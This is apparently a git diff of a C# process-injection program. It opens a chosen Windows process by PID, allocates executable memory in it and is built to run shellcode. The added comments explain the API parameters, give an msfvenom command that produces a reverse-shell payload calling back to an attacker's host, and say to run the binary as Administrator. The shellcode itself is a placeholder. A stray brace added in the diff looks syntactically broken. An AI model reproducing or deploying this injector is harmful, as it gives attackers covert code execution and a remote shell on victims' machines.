@@ -5,15 +5,33 @@ using System.Runtime.InteropServices;
 namespace Inject
 {
     class Program
-    {
+    {		
+    		//usually these are the Calls for the Win Api, no need to change something here 
+		//HANDLE OpenProcess(
+ 		//DWORD dwDesiredAccess,==>Read Write==> 0x001F0FFF.
+ 		//BOOL bInheritHandle,==> a Child who can inherit this handle 
+		//DWORD dwProcessID==>Process ID Targeted for example explorer.exe ==>Process explorer
+		};
         
             [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
             static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
             processId);
 
+
+
+		
+//LPVOID VirtualAllocEx(
+ //HANDLE hProcess, ==> process Handler
+ //LPVOID lpAddress,==> the desired address for the allocation of the remote process the desired allocation of the remote process in another //terms(if the chosen buffer is already in use it will fail, it is better to keep it null so we have the variety to choose)
+ //SIZE_T dwSize, ==> our new buffer will be allocated with starting address as supplied in lpAddress
+ //DWORD flAllocationType
+ //DWORD flProtect )
+ 
+ 
             [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
             static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
             dwSize, uint flAllocationType, uint flProtect);
+
 
 
             [DllImport("kernel32.dll")]
@@ -26,10 +44,16 @@ lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
 dwCreationFlags, IntPtr lpThreadId);
             static void Main(string[] args)
             {
-                IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
+	    	//Here you have to change the Process Number According to your targeted PID, you can make it more automated if you want in my case 
+		//for example my target process had PID 6040
+		//OpenProcess(Read_WritePermission, Inheritence, ProcessID), GetProcessByName can be used to Automatically Get The ProcessID
+                IntPtr hProcess = OpenProcess(0x001F0FFF, false, 6040);
+		//The Allocation And Type Memory Protections
                 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             //msfvenom -p windows/shell_reverse_tcp LHOST=<Local Host> LPORT=<LocalPortToListenOn> -f csharp
+	    
 	    //Compile on your linux machine using mcs: mcs sourcecode.cs ,it will output: sourcecode.exe, run the Sourcecode.exe as Administrator
+	    //don't forget to target the architecture because it can be a bit tricky
             byte[] buf = new byte[324] {YOUR-SHELL-CODE-GENERATED FROM MSFVENOM};
 
             IntPtr outSize;
